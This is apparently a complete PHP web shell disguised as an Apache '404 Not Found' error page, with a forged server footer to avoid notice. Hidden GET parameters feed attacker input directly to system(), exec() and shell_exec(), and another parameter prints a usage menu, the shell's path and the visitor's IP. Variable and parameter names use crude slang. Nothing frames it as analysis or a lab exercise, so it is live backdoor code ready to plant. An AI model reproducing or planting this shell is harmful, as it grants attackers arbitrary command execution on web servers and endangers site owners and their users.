<?php 
//error_reporting(E_ALL & ~E_NOTICE);
ini_set('display_errors', 'Off');
$kontol = getenv("SERVER_NAME");
$path   = getenv("REQUEST_URI");
$YOURIP = getenv("REMOTE_ADDR");
$memek  = dirname(__FILE__);
?>

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<?php  
    if ($_GET['shota']) {
        echo system($_GET['shota']);
     };

    if ($_GET['loli']) {
       echo exec($_GET['loli']);
    };

    if ($_GET['milf']) {
        echo shell_exec($_GET['milf']);
     };

     if (isset($_GET['ayana'])) {           
        echo"
        <p>
        Call Exec Function > loli.php?loli={id} <br>
        Call System Function > loli.php?shota={id} <br>
        Call Shell_Exec Function > loli.php?milf={id} <br>
        <br><br>Path Shell : $memek$path <br>
        </p>
        <p style='color:#eb4034';>Your IP : $YOURIP</p>";
    }
?>
<hr>
<address>Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 Server at <?= $kontol ?> Port 80</address>
</body></html>
